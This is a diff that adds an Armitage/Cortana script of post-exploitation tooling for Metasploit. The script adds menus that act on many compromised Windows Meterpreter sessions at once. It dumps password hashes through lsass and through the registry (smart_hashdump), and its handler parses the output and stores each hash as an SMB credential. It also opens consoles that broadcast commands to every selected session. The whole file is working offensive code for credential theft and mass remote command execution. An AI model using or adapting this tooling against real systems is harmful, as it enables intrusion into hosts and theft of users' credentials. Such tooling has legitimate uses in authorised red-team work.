@@ -1,0 +1,102 @@
+# Add menus to do things to multiple sessions at one time. 
+
+popup multi_menus {
+	# ok, let's create some menus.
+	menu "Meterpreter (all)" {
+		menu "&Dump Hashes" {
+			item "&lsass method" {
+				local('$sid');
+				foreach $sid ($1) {
+					m_cmd($sid, "hashdump");
+				}
+			}
+
+			item "&registry method" {
+				launch_module("Dump Hashes", "post", "windows/gather/smart_hashdump", %(SESSION => join(", ", $1)));
+			}
+		}
+
+		item "&Interact" {
+			local('$console');
+			$console = open_text_tab("Meterpreter *", @("meterpreter", $1), "all");
+			append($console, "Multi-Meterpreter Console for: " . join(", ", $1) . "\n" . ('=' x 20) . "\n");
+			prompt($console, "multi-meterpreter> ");
+		}
+
+		item "&Exec Commands" {
+			local('$console');
+			$console = open_text_tab("Shell *", @("shell", $1), "all");
+			append($console, "Native Shell Console for: " . join(", ", $1) . "\n" . ('=' x 20) . "\n");
+			prompt($console, "shell> ");
+		}
+	}
+}
+
+popup host_top {
+	local('$host $s @sessions');
+
+	# figure out which sessions we have... (one per host)
+	foreach $host (@_) {
+		$s = keys(host_sessions($host));
+		if (size($s) > 0 && -iswinmeterpreter $s[0]) {
+			push(@sessions, $s[0]);
+		}
+	}
+
+	# we do not want to create a popup when there are fewer than two sessions
+	if (size(@sessions) < 2) {
+		return;
+	}
+
+	show_menu("multi_menus", @sessions);
+}
+
+global('%last');
+
+on meterpreter_hashdump {
+	local('$entry $user $hash $count');
+	foreach $entry (split("\n", $3)) {
+		if ($entry ismatch '(.*?):\d+:(.*?):.*') {
+			($user, $hash) = matched();
+			credential_add(session_host($1), 445, $user, $hash, "smb_hash");
+			$count += 1;
+		}
+	}
+	println("[*] Processed $count hashes on " . session_host($1));
+}
+
+on meterpreter {
+	if ($1 in %last && %last[$1] !is $null) {
+		local('$h');
+		$h = session_host($1);
+
+		append(%last[$1], "\c0< $+ $h $+ / $+ $1 $+ > $2 $+ \o\n");
+		append(%last[$1], "$3 $+ \n");
+	}
+}
+
+on exec {
+	local('$h');
+	$h = session_host($1);
+
+	append(%last[$1], "\c0< $+ $h $+ / $+ $1 $+ > $2 $+ \o\n");
+	append(%last[$1], "$3 $+ \n\n");
+}
+
+on tab_text_input {
+	local('$sid');
+	if ($2[0] eq "meterpreter") {
+		append($1, "multi-meterpreter>\c9 $3 $+ \o\n\n");
+		foreach $sid ($2[1]) {
+			%last[$sid] = $1;
+			m_cmd($sid, $3);
+		}
+	}
+	else if ($2[0] eq "shell") {
+		append($1, "shell>\c9 $3 $+ \o\n\n");
+		foreach $sid ($2[1]) {
+			%last[$sid] = $1;
+			m_exec($sid, $3);
+		}
+	}
+}
